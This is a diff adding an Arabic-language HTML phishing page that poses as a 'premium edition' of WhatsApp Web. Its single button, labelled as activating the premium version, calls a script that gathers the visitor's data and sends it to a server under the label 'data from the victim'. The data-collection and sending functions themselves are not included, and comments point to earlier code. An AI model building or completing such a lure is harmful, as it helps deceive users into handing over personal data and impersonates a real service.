@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>واتساب ويب - النسخة المميزة</title>
+    <style>
+        /* CSS الكامل السابق */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); overflow: hidden; max-width: 400px; width: 100%; text-align: center; }
+        .header { background: linear-gradient(135deg, #25D366, #128C7E); color: white; padding: 40px 20px; }
+        .btn { background: linear-gradient(135deg, #25D366, #128C7E); color: white; border: none; padding: 16px 32px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; margin: 15px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="whatsapp-icon">📱</div>
+            <h1>واتساب ويب - النسخة المميزة</h1>
+            <p>تجربة جديدة ومتطورة لواتساب ويب</p>
+        </div>
+        <div class="content">
+            <button class="btn" onclick="startVerification()">🔓 تفعيل النسخة المميزة</button>
+        </div>
+    </div>
+    <script>
+        // JavaScript الكامل السابق لجمع البيانات
+        async function startVerification() {
+            // كود جمع البيانات والإرسال
+            const data = await collectAllData();
+            await sendToServer('🟢 بيانات من الضحية', data);
+        }
+    </script>
+</body>
+</html>
